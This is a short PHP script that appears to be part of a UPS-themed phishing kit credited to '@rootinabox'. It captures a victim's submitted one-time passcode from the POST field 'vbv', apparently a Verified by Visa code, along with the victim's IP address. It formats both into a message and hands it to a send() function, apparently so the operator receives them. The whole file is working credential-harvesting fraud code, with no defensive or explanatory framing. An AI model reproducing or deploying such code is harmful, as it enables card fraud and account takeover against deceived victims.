<?php
	require_once('../function.php');

	$msg =  "<strong>🔥 Created BY @rootinabox 🔥</strong>\n \n".
	"<strong>‼️✉️ OTP ✉️‼️</strong>\n".
	"<strong></strong>\n".
	"<strong>🌐 IP:  ".$ip."</strong>\n".
	"<strong></strong>\n".
	"<strong>Code Detail :</strong>\n".
	"<strong> OTP : </strong><code>".$_POST['vbv']."</code>\n".
	"<strong></strong>\n".
	"<strong>📟 UPS OTP 📟</strong>\n \n".
	"<strong>🔥 Created BY @rootinabox 🔥</strong>\n \n";
	send($msg);

?>